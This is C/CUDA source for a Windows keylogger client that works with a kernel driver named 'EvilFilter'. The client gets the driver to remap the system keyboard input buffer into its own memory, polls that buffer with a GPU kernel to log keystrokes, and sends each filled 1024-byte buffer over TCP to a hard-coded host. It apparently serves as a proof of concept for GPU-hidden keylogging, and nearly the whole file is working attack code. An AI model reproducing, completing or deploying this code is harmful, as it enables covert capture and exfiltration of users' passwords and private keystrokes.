#include "stdafx.h"
#include <SharedHeader.h>
#include <stdio.h>
#include <kernelspecs.h>
#include <stdlib.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <io.h>
#include <windows.h>
#include <winbase.h>
#include <cuda.h>
#include <cuda_runtime.h>
#include "helper_cuda.h"
#include "device_launch_parameters.h"
#include <DbgEng.h>
#include <process.h>
#include <psapi.h>
#include <time.h>
#include <scancode.h>

#include <winsock.h>

#define DEBUG 1
//#define BUFFER_SIZE 8192
#define BUFFER_SIZE 1024

__global__ void copyKeyboardBuffer(PCHAR inBuffer, PCHAR outBuffer, PULONG keystrokeIndex) {
	int index = blockIdx.x*blockDim.x + threadIdx.x;
	// TODO: encrypt keystroke here? XOR 0x65?
	outBuffer[index] = inBuffer[index];
	*keystrokeIndex = 0;
}

__global__ void logKeyboardData(PKEYBOARD_INPUT_DATA keyboardData, PCHAR KeyMap, PCHAR cudaBuffer, PUSHORT lastMake, PUSHORT lastModifier, PULONG keystrokeIndex) {
	int index = blockIdx.x*blockDim.x + threadIdx.x;
	if (index == 0) {
		if (*lastMake != keyboardData->MakeCode || *lastModifier != keyboardData->Flags) { // keyboardData->MakeCode != 0

			printf("GPUZ: %u %u %lu \n", *lastMake, *lastModifier, *keystrokeIndex);
			if (*keystrokeIndex < BUFFER_SIZE) {
				printf("Incrementing keystroke index");
				cudaBuffer[(*keystrokeIndex)++] = KeyMap[keyboardData->MakeCode];
			}
			printf("GPU: %s SC:[0x%x] [%c] unit[0x%x] flags[0x%x] res[0x%x] ext[0x%lx] [%lu]\n",
				keyboardData->Flags == KEY_BREAK ? "Up  " : keyboardData->Flags == KEY_MAKE ? "Down" : "Unkn",
				keyboardData->MakeCode,
				KeyMap[keyboardData->MakeCode],
				keyboardData->UnitId,
				keyboardData->Flags,
				keyboardData->Reserved,
				keyboardData->ExtraInformation, *keystrokeIndex);

			*lastMake = keyboardData->MakeCode;
			*lastModifier = keyboardData->Flags;
				
		}
	}
}

/**
 * The overall strategy here is to make 2 calls to the driver obkect 
 * - the first is to get the offset for the pointer to the keyboard buffer
 * Then I loop through allocating variables until I get one with the correct 
 * offset.  
 * - the second call is with the pointer that has an identical offset
 * so that the driver can remap its page to the page with the keyboard buffer
 * 
 * once I have the maspped pointer I pass it to the CUDA routine so that it can begin monitoring it
 */
int main(int argc, _TCHAR* argv[]) {
#define IOCTL_CUSTOM_CODE CTL_CODE(FILE_DEVICE_UNKNOWN, 0, METHOD_OUT_DIRECT, FILE_ANY_ACCESS)
	HANDLE hControlDevice;
	ULONG  bytes;

	hControlDevice = CreateFile(TEXT("\\\\.\\EvilFilter"), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);

	if (INVALID_HANDLE_VALUE == hControlDevice) {
		printf("Failed to open EvilFilter device\n");
	}
	else {

		PKEYBOARD_INPUT_DATA keyboardData;
		PSHARED_MEMORY_STRUCT dataToTransmit;

		keyboardData = (PKEYBOARD_INPUT_DATA)malloc(sizeof(KEYBOARD_INPUT_DATA));
		dataToTransmit = (PSHARED_MEMORY_STRUCT)malloc(SharedMemoryLength);
		dataToTransmit->instruction = 'O';
		dataToTransmit->offset = 0;

		// Get the Buffer Offset
		if (!DeviceIoControl(hControlDevice, IOCTL_CUSTOM_CODE, NULL, 0, dataToTransmit, SharedMemoryLength, &bytes, NULL)) {
			printf("Ioctl to EvilFilter device (attempt to get offset) failed\n");
		}
		else {
			ULONG kmdfOffset;
			ULONG keyboardOffset;
			PLLIST listNode;

			kmdfOffset = dataToTransmit->offset;
			printf("Ioctl to EvilFilter device succeeded...KMDF offset is [0x%lx]\n", kmdfOffset);
			keyboardOffset = (ULONG)keyboardData & 0x0fff;
			if (dataToTransmit->largePage) {
				keyboardOffset = (ULONG)keyboardData & 0x1fffff;
			}
			printf("keyboardData is [0x%lx] offset is [0x%lx].\n Trying to get pointer with 'correct' offset [0x%lx]\n", keyboardData, keyboardOffset, kmdfOffset);
			// create a pointer with the correct offset
			listNode = (PLLIST)malloc(sizeof(LLIST));
			listNode->keyboardBuffer = keyboardData;
			listNode->previous = NULL;
			while (keyboardOffset != kmdfOffset) {
				keyboardData = (PKEYBOARD_INPUT_DATA)malloc(sizeof(KEYBOARD_INPUT_DATA));
				if (dataToTransmit->largePage) {
					keyboardOffset = (ULONG)keyboardData & 0x1fffff;
				}
				else {
					keyboardOffset = (ULONG)keyboardData & 0xfff;
				}
				PLLIST previousListNode = listNode;
				listNode = (PLLIST)malloc(sizeof(LLIST));
				listNode->keyboardBuffer = keyboardData;
				listNode->previous = previousListNode;
			}

			printf("keyboardData is [0x%lx] - freeing unused memory...\n", keyboardData);
			while (listNode != NULL) {
				PLLIST currentListNode = listNode;
				listNode = listNode->previous;
				if (currentListNode->keyboardBuffer != keyboardData) {
					free(currentListNode->keyboardBuffer);
				}
				free(currentListNode);
			}
			dataToTransmit->ClientMemory = keyboardData;
			dataToTransmit->instruction = 'E';

			// Get the Keyboard Buffer
			if (!DeviceIoControl(hControlDevice, IOCTL_CUSTOM_CODE, NULL, 0, dataToTransmit, SharedMemoryLength, &bytes, NULL )) {
				printf("Ioctl to EvilFilter device failed - unable to remap PTE\n");
			}
			else {
				PKEYBOARD_INPUT_DATA d_KeyboardData;
				PCHAR d_KeyMap;
				PCHAR d_KeystrokeBuffer;
				PCHAR d_OutgoingKeystrokeBuffer;
				PUSHORT d_lastMake;
				PUSHORT d_lastModifier;
				PULONG d_keystrokeIndex;
				PULONG h_keystrokeIndex;
				PCHAR h_KeystrokeBuffer;
				USHORT init0 = 666U;
				ULONG init0long = 0LU;

				printf(" init0 [%u] init0long [%lu]\n", init0, init0long);

				printf("Ioctl to EvilFilter device succeeded \n");
				printf("keyboardData=[0x%lx]\n", keyboardData);
				printf(" we now have the real keyboard buffer!!!\n");
				//send address to GPU

				checkCudaErrors(cudaSetDevice(0));
				checkCudaErrors(cudaSetDeviceFlags(cudaDeviceMapHost));

				h_keystrokeIndex = (PULONG)malloc(sizeof(ULONG));
				*h_keystrokeIndex = 0;
				h_KeystrokeBuffer = (PCHAR)malloc(sizeof(CHAR) * BUFFER_SIZE);

				printf("Allocating lastMake...\n");
				checkCudaErrors(cudaMalloc(&d_lastMake, sizeof(USHORT)));
				printf("Allocating lastModifier...\n");
				checkCudaErrors(cudaMalloc(&d_lastModifier, sizeof(USHORT)));
				printf("Allocating keystrokeIndex...\n");
				checkCudaErrors(cudaMalloc(&d_keystrokeIndex, sizeof(ULONG)));

				printf("Allocating cudaBuffer...\n");
				checkCudaErrors(cudaMalloc(&d_KeystrokeBuffer, sizeof(CHAR) * BUFFER_SIZE));
				printf("Allocating cudaBuffer...\n");
				checkCudaErrors(cudaMalloc(&d_OutgoingKeystrokeBuffer, sizeof(CHAR) * BUFFER_SIZE));
				printf("Allocating cudaKeyMap...\n");
				checkCudaErrors(cudaMalloc((void **)&d_KeyMap, sizeof(char) * 84));
				
				printf("Copying 0 to lastMake...");
				checkCudaErrors(cudaMemcpy(d_lastMake, &init0, sizeof(USHORT), cudaMemcpyHostToDevice));	printf("coppied.\n");
				printf("Copying 0 to lastModifier...");
				checkCudaErrors(cudaMemcpy(d_lastModifier, &init0, sizeof(USHORT), cudaMemcpyHostToDevice));	printf("coppied.\n");
				printf("Copying 0 to keystrokeIndex...");
				checkCudaErrors(cudaMemcpy(d_keystrokeIndex, &init0long, sizeof(ULONG), cudaMemcpyHostToDevice));	printf("coppied.\n");
				printf("Copying KeyMap to cudaKeyMap...");
				checkCudaErrors(cudaMemcpy(d_KeyMap, KeyMap, 84 * sizeof(char), cudaMemcpyHostToDevice));	printf("coppied.\n");

				printf("Registering KeyboardData for use by CUDA...\n");
				checkCudaErrors(cudaHostRegister(keyboardData, 10 * sizeof(char), cudaHostRegisterMapped));
				printf("getting device pointer for KeyboardData...\n");
				checkCudaErrors(cudaHostGetDevicePointer((void **)&d_KeyboardData, (void *)keyboardData, 0));
				// TODO: make last make code and last flag here and pass them back and forth to the CUDA kernel
				printf("Launching CUDA process.\n");
				dim3 grid(1);
				dim3 block(1); 
				while (TRUE) { 
					logKeyboardData <<<1, 1 >>>(d_KeyboardData, d_KeyMap, d_KeystrokeBuffer, d_lastMake, d_lastModifier, d_keystrokeIndex);
					checkCudaErrors(cudaDeviceSynchronize());

					checkCudaErrors(cudaMemcpy(h_keystrokeIndex, d_keystrokeIndex, sizeof(ULONG), cudaMemcpyDeviceToHost));
					if (*h_keystrokeIndex >= BUFFER_SIZE) {
						printf("copying buffer.\n");
						copyKeyboardBuffer <<<2, 512 >>>(d_KeystrokeBuffer, d_OutgoingKeystrokeBuffer, d_keystrokeIndex);
						checkCudaErrors(cudaDeviceSynchronize());
						checkCudaErrors(cudaMemcpy(h_KeystrokeBuffer, d_OutgoingKeystrokeBuffer, sizeof(CHAR) * BUFFER_SIZE, cudaMemcpyDeviceToHost));
						printf("sending buffer.\n"); 
						xmitBuffer(h_KeystrokeBuffer);
					}
				}
			}
		}
		CloseHandle(hControlDevice);
	}
	return 0;
}



void xmitBuffer(char * echoString) {
	int sock;
	struct sockaddr_in echoServAddr;
	USHORT echoServPort = 7;
	PCHAR servIP = "192.168.0.122";
	int echoStringLen;
	WSADATA wsaData;

	if (WSAStartup(MAKEWORD(2, 0), &wsaData) != 0) {
		fprintf(stderr, "WSAStartup() failed");
		return;
	}
	if ((sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
		fprintf(stderr, "socket() failed");
		return;
	}

	memset(&echoServAddr, 0, sizeof(echoServAddr));
	echoServAddr.sin_family = AF_INET;
	echoServAddr.sin_addr.s_addr = inet_addr(servIP);
	echoServAddr.sin_port = htons(echoServPort);
	if (connect(sock, (struct sockaddr *) &echoServAddr, sizeof(echoServAddr)) < 0) {
		fprintf(stderr, "connect() failed");
		return;
	}

	echoStringLen = strlen(echoString);
	send(sock, echoString, echoStringLen, 0);
	closesocket(sock);
	WSACleanup();

	return;
}



